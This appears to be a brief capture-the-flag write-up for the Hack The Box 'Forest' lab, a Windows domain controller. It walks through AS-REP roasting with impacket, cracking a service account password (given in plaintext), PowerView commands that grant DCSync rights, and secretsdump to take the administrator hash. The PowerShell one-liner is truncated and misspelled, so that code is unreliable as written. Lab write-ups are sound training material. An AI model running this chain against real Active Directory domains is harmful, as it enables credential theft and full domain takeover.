Started with a nmap scan
```
53 DNS
88 Kerberos
135
139
389 LDAP
445
636
3268 LDAP
3269
5985
```
Domain `htb.local` Hostname `FOREST` 
Testing some stuff out we have anonymouse LDAP bind and can get a list of users and then we can use `impacket-GetNPUsers` to request a kerb hash `impacket-getnpusers htb.local/ -request` and we got `svc-alfresco` we can use hashcat to crack it and we got the creds now `svc-alfresco:s3rvice` and this user has winrm access now we get bloodhound data and this user is apart of `account operators` so we can dacl edit and then DCSync to get admin hash first we need to import powerview and then run this command 
```
Add-DomainGroupMember -Identity 'Exchnage Windows Permissions' -Memebrs svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object {$secstr.AppendChar($_)}; $cred = new-object -typename; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```
now we can use secrets dump `impacket-secretsdump 'htb.local/svc-alfresco:s3rvice'@10.10.10.161` and now we have the admin hash and can winrm into the admin account 